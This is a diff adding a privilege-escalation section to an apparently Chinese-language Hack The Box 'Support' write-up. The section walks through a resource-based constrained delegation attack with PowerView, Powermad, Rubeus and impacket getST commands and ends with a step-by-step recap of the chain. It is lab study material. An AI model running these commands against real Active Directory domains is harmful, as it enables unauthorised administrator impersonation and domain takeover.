@@ -180,4 +180,89 @@ CS上个线
 
 ![](https://img.mi3aka.eu.org/2022/08/ae51322ea25d173ea737668a4ed64167.png)
 
-提权暂时没有思路...
+~提权暂时没有思路...~
+
+>Kerberos委派攻击
+
+[https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)
+
+[https://xz.aliyun.com/t/7217](https://xz.aliyun.com/t/7217)
+
+>如果您对该计算机的 AD 对象具有 WRITE 权限，则可以在远程计算机上以提升的权限获得代码执行。
+
+域控制器名称`dc.support.htb`
+
+加载`PowerView.ps1`,在`LSTAR/scripts/InfoCollect`里面
+
+![](https://img.mi3aka.eu.org/2022/08/2810528b74bd2a250bcbae6e9583a850.png)
+
+加载[Powermad.ps1](https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1)
+
+```
+New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+Get-DomainComputer FAKE01
+```
+
+![](https://img.mi3aka.eu.org/2022/08/06bd34f8941418ffb2ce065d0b8cc1d8.png)
+
+```
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1677581083-3380853377-188903654-5101)"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+Get-DomainComputer DC | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
+```
+
+![](https://img.mi3aka.eu.org/2022/08/c524ea6b3abd879413cce448b39e7b60.png)
+
+从[https://github.com/r3motecontrol/Ghostpack-CompiledBinaries](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)获取`Rubeus.exe`
+
+`.\Rubeus.exe hash /password:123456 /user:FAKE01 /domain:offense.local`
+
+```
+[*] Input password             : 123456
+[*] Input username             : FAKE01
+[*] Input domain               : offense.local
+[*] Salt                       : OFFENSE.LOCALFAKE01
+[*]       rc4_hmac             : 32ED87BDB5FDC5E9CBA88547376818D4
+[*]       aes128_cts_hmac_sha1 : 3D33480EFAE7A9D3CEFCF2809D6B1721
+[*]       aes256_cts_hmac_sha1 : C3178E04A2D3587512B72838F32FABC7735FE78B7AC0CCC3787E78F614024451
+[*]       des_cbc_md5          : FDF1D320C28C750E
+```
+
+![](https://img.mi3aka.eu.org/2022/08/bfc6c6ff7e845e946b12b0c74118ab24.png)
+
+但是在`.\Rubeus.exe s4u /user:FAKE01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:spotless /msdsspn:cifs/dc.offense.local /ptt`这一步卡住了...
+
+![](https://img.mi3aka.eu.org/2022/08/8dfb3a35487783337987e17609a82c86.png)
+
+---
+
+用[impacket/examples](https://github.com/SecureAuthCorp/impacket/tree/master/examples)中的`getST.py`
+
+`python3 getST.py support.htb/FAKE01:123456 -dc-ip 10.10.11.174 -impersonate administrator -spn www/dc.support.htb`
+
+![](https://img.mi3aka.eu.org/2022/08/006be78d9ec0dfd0eac39a8a28f91f62.png)
+
+[https://xz.aliyun.com/t/8665#toc-5](https://xz.aliyun.com/t/8665#toc-5)
+
+使用获取到的`ccache`
+
+![](https://img.mi3aka.eu.org/2022/08/8870bc274dd45bafef3a57fac53d6687.png)
+
+![](https://img.mi3aka.eu.org/2022/08/4b85f95f473dbcd842aac660ee68abb6.png)
+
+---
+
+>捋下思路
+
+1. 通过nmap和goby发现开放`445`和`5985`端口
+
+2. 通过smbclient读取到一个压缩包,对其中的`userinfo.exe`进行逆向,得到一个ldap的密码
+
+3. 利用该密码进行`ldapsearch`,列出`CN=Users,DC=support,DC=htb`并进行分析,在`name=support`时得到一个`info`
+
+4. 利用得到的`info`作为密码成功登入`winrm`
+
+5. 进行约束委派,在域中创建一个新的对象,并更新属性`msDS-AllowedToActOnBehalfOfOtherIdentity`,使其能够冒充域用户(包括管理员)
+
+6. 用`impacket`系列的`getST`请求`administrator`的`TGT`得到`administrator.ccache`,并利用该`ccache`冒充管理员成功利用`wimexec`登录系统
